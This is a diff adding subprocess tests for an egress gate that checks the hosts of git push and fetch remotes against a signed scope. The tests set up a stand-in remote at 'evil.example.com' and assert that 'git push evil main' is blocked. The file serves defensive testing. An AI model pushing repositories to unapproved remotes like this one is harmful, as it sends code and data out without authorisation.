@@ -100,6 +100,34 @@ describe("kit gate-egress (subprocess)", () => {
   });
 });
 
+describe("kit gate-egress: git remotes (subprocess)", () => {
+  const git = (...args: string[]) =>
+    assert.equal(spawnSync("git", args, { cwd: proj, encoding: "utf8" }).status, 0);
+  beforeEach(() => {
+    git("init", "-q");
+    git("remote", "add", "origin", "https://api.acme.com/org/repo.git");
+    git("remote", "add", "evil", "git@evil.example.com:org/repo.git");
+  });
+
+  it("checks a named remote's host against the signed scope", () => {
+    assert.equal(runGate("gate-egress", bash("git push origin main")).status, 0);
+    const r = runGate("gate-egress", bash("git push evil main"));
+    assert.equal(r.status, 2);
+    assert.match(r.stderr, /evil\.example\.com/);
+  });
+
+  it("denies a remote git cannot resolve as an unknown host", () => {
+    const r = runGate("gate-egress", bash("git fetch nosuch"));
+    assert.equal(r.status, 2);
+    assert.match(r.stderr, /unknown host .*nosuch/);
+  });
+
+  it("leaves git remotes alone with no verified scope", () => {
+    rmSync(join(proj, ".kit-profile.sig"), { force: true });
+    assert.equal(runGate("gate-egress", bash("git push evil main")).status, 0);
+  });
+});
+
 describe("kit gate-fs (subprocess)", () => {
   it("allows a write inside the signed fs scope", () => {
     assert.equal(runGate("gate-fs", write("src/index.ts")).status, 0);
